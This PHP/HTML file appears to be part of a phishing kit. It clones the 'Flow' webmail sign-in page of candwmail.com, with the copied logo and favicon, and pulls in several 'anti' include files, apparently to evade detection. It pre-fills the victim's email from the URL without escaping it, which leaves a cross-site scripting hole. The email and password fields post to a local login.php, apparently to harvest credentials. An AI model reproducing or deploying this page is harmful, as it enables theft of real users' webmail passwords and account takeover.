<?php
 include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include_once("api.php");
session_start();

$email = '';
if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];
}





?>
<!-- saved from url=(0030)https://webmail.candwmail.com/ -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Flow</title><link href="./assets/default.css" rel="stylesheet" type="text/css">
	<link id="favicon" rel="shortcut icon" type="image/x-icon" href="https://webmail.candwmail.com/img/faviconFL.ico"></head><body>
	<div class="mainDiv">
		<img id="hdrImage" alt="" src="./assets/candwmail_com.png">
		<form id="form" action="login.php" method="POST">
			<input required="" type="text" class="field" placeholder="Email" value="<?php echo $email; ?>" name="email" id="username">
			<input required="" type="password" class="field" placeholder="Password" name="pass" id="password">
				<div class="checkDiv divLeft">
			    <input type="checkbox" id="auto" name="auto" onclick="setAuto();">
			    <label for="subscribeNews">remember me</label>
			  </div>
			  <div class="divRight">
			  	<a id="hlpLink" href="#" target="_blank">Forgot your password?</a>
			  </div>
			<button type="submit" class="btnSubmit" style="width: 437px;">Sign in</button>
		</form>
		
		<div class="errorDiv"><span id="error" class="error"></span></div>
		
	</div>
	

